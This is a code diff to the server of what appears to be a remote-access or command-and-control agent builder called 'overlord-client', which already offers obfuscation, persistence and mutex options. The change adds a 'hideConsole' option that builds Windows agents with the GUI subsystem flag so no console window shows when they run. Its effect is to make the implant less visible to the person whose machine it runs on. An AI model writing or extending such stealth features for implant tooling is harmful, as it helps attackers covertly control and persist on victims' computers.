@@ -464,6 +464,7 @@ async function startBuildProcess(
     disableCgo?: boolean;
     obfuscate?: boolean;
     enablePersistence?: boolean;
+    hideConsole?: boolean;
   }
 ) {
   const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
@@ -605,6 +606,12 @@ async function startBuildProcess(
         const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
         ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
         sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
+      }
+
+      if (config.hideConsole && os === "windows") {
+        const hideConsoleFlag = "-H=windowsgui";
+        ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
+        sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
       }
 
       if (config.obfuscate) {
@@ -1818,7 +1825,7 @@ async function startServer() {
             requirePermission(user, "clients:control");
             
             const body = await req.json();
-            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex } = body;
+            const { platforms, serverUrl, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex, hideConsole } = body;
             
             if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
               return Response.json({ error: "No platforms specified" }, { status: 400 });
@@ -1852,7 +1859,7 @@ async function startServer() {
             });
             
             
-            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence });
+            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence, hideConsole: !!hideConsole });
             
             return Response.json({ buildId });
           }
